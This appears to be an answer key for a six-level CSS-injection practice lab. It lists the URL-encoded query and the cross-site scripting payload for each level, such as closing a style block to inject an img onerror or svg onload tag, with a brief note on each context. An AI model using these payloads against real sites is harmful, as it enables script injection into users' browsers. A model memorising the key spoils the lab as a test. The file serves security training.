# css-injection — solutions

CSS sinks that can pivot to script execution (legacy expression(), @import, url(), content, attr).

### css-injection-level1

`/css/level1/?query=%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `</style><img src=x onerror=alert(1)>`
- context: inside CSS expression() in a `<style>` block; the CSS vector is legacy-only, so close `</style>` and inject a tag

### css-injection-level2

`/css/level2/?query=%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `</style><img src=x onerror=alert(1)>`
- context: inside @import url('...') in a `<style>` block; the CSS vector is legacy-only, so close `</style>` and inject a tag

### css-injection-level3

`/css/level3/?query=%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `</style><img src=x onerror=alert(1)>`
- context: inside background-image url('...') in a `<style>` block; the CSS vector is legacy-only, so close `</style>` and inject a tag

### css-injection-level4

`/css/level4/?query=%27;}%3C/style%3E%3Csvg%20onload=alert(1)%3E`

- payload: `';}</style><svg onload=alert(1)>`
- context: inside content:'...' in a `<style>` — close style block then inject HTML

### css-injection-level5

`/css/level5/?query=%27);}%3C/style%3E%3Csvg%20onload=alert(1)%3E`

- payload: `');}</style><svg onload=alert(1)>`
- context: inside @keyframes url('...') in `<style>` — close style block then inject

### css-injection-level6

`/css/level6/?query=%27%3E%3Csvg%20onload=alert(1)%3E`

- payload: `'><svg onload=alert(1)>`
- context: inside `data-content='...'` attribute — break out with `'` then `>`
